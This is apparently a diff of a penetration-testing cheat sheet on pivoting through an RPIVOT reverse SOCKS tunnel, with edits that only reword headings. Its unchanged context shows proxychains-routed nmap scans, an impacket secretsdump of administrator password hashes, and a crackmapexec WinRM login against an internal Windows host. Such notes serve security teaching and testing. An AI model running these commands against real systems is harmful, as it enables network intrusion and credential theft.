@@ -1,5 +1,5 @@
 ======================================================================================================================================================
-Pivoting with RPIVOT (basic example)
+Pivoting with Rpivot (basic example)
 ======================================================================================================================================================
 
 RPIVOT - reverse socks 4 proxy for penetration tests
@@ -124,7 +124,6 @@ Backconnecting to server 192.168.56.104 port 443
 PoC/Example - Step 3 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with Rpivot to pivot into the internal network
 ==========================================================================================================================================================
 
-
 Without using Proxychains and the Rpivot tunnel the network connection is filtered to the Windows server '192.168.13.154' from the Kali VM '192.168.56.54'
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -141,8 +140,8 @@ PORT     STATE    SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
 
 
-Example 1 - Nmap port scans of an internal Windows server over the Rpivot tunnel
-----------------------------------------------------------------------------------
+Example 1 - Nmap port scan of the Windows server (192.168.13.154) over the Rpivot tunnel
+-----------------------------------------------------------------------------------------
 
 jeff@kali:~$ proxychains nmap -sT 192.168.13.154 -p 445,3389 
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -162,8 +161,8 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 28.17 seconds
 
 
-Example 2 - Secretsdump (impacket) connection to an internal server over the Rpivot tunnel
--------------------------------------------------------------------------------------------
+Example 2 - Secretsdump (impacket) connection to the Windows server (192.168.13.154) over the Rpivot tunnel
+------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~$ proxychains impacket-secretsdump server2/administrator@192.168.13.154
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -183,8 +182,9 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b3b0692c09bb03d1<SNIP>
 <SNIP>
 
 
-Example 3 - Crackmapexec (impacket) connection to an internal server over the Rpivot tunnel
--------------------------------------------------------------------------------------------
+Example 3 - Crackmapexec connection to the Windows server (192.168.13.154) over the Rpivot tunnel
+-------------------------------------------------------------------------------------------------
+
 jeff@kali:~$ proxychains crackmapexec winrm 192.168.13.154 -u administrator -p <SNIP>
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.168.13.154:5986-<--timeout
